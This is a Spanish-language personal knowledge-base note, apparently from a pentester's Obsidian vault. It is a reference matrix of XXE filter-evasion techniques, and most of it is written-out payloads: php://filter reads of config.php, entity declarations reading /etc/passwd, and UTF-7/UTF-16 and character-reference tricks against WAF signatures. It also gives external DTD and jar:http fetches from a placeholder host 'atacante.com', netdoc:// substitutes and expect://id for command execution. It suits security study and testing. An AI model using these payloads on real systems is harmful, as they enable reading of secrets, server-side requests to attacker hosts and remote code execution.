---
tipo: meta
aliases:
  - Evasión XXE
  - Bypass de filtros XML
tags:
  - meta/referencia
  - dominio/web
---

# XXE evasión - matriz de referencia

> [!info] Referencia pura, no un zettel
> Una sección por obstáculo, en el mismo orden que el árbol de obstáculos de [[MOC - XXE]].

## El archivo rompe el XML

El obstáculo más frecuente, y no es un filtro: es el formato. Un archivo con `<` o `&` convierte el documento en XML mal formado y el parser aborta antes de devolver nada.

```
php://filter/convert.base64-encode/resource=/var/www/html/config.php
```

PHP. Devuelve base64, que siempre es XML válido. Es la solución por defecto y hay que usarla salvo que se sepa que el archivo es texto limpio.

```xml
<foo><![CDATA[&xxe;]]></foo>
```

**No funciona**: las entidades no se expanden dentro de una sección CDATA. Es un error frecuente. La construcción que sí sirve arma el CDATA con entidades de parámetro desde una DTD externa, y a esa altura conviene usar base64 y terminar antes.

`parse="text"` en [[XXE - XInclude]] cumple la misma función: pide el recurso como texto plano en vez de como XML.

## `DOCTYPE` bloqueado

Cuando el parser rechaza cualquier declaración de tipo de documento, o cuando la entrada va embebida en un XML ajeno.

**XInclude.** No necesita `DOCTYPE` ni DTD. Es la respuesta canónica y tiene nota propia: [[XXE - XInclude]].

```xml
<?xml version="1.0" encoding="UTF-16"?>
```

Recodificar el documento entero a UTF-16 o UTF-7. Un filtro que busca la cadena `<!DOCTYPE` en bytes no la encuentra, y el parser la lee igual porque respeta la declaración de codificación. Sirve contra WAF, no contra un parser con el DTD apagado.

## Filtro de cadena

WAF o validación que busca `<!ENTITY`, `SYSTEM` o `DOCTYPE`.

```xml
<!DOCTYPE foo PUBLIC "-//x//x//EN" "http://atacante.com/e.dtd">
```

`PUBLIC` en lugar de `SYSTEM`. Mismo efecto, otra palabra clave.

```xml
<!DOCT&#x59;PE
```

Referencias de carácter dentro de las palabras clave. El soporte varía por parser; vale la prueba porque cuesta poco.

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-...
```

UTF-7. Solo funciona en parsers que la soporten, cada vez menos, y por eso está al final de la lista.

Espacios y saltos de línea entre las partes de la declaración rompen firmas literales:

```xml
<!DOCTYPE
   foo
   [ <!ENTITY  xxe  SYSTEM  "file:///etc/passwd" > ]>
```

## Sin egress

Se cierran fuera de banda y la DTD externa.

1. **Canal directo**, si hay reflejo — no necesita red en absoluto.
2. **[[XXE - canal por error]]** con una DTD local ya presente en el sistema, redefiniendo una de sus entidades. Ver [[XXE payloads - matriz de referencia]] § 3.
3. **XInclude con `file://`** — lectura local pura, sin una sola conexión.

Los tres funcionan en una red completamente cerrada. Es la diferencia importante con [[MOC - SSRF]], donde sin red no queda nada.

## El esquema está filtrado

Si `file://` está bloqueado pero el DTD funciona:

```
netdoc:///etc/passwd
```

Java. Sustituto de `file://` que sobrevive a filtros que solo bloquean el nombre obvio.

```
jar:file:///tmp/x.jar!/x
jar:http://atacante.com/x.jar!/x
```

Java. La variante remota además **retiene el archivo temporal** mientras el parser espera, lo que en ciertos escenarios habilita otras cosas.

```
php://filter/...
expect://id
```

PHP. El segundo es RCE, y depende de un módulo que casi nunca está.

## Cuando nada entra

Si el parser tiene el DTD deshabilitado, XInclude apagado y valida la entrada antes de insertarla, no hay bypass: está bien configurado. Es la mitigación de una línea, y cuando está puesta, está puesta.

Antes de darlo por cerrado conviene verificar que se probaron **todas** las superficies, no solo la obvia: un endpoint puede estar endurecido y el procesador de subidas del mismo sistema no. Ver [[XXE formatos - matriz de referencia]].
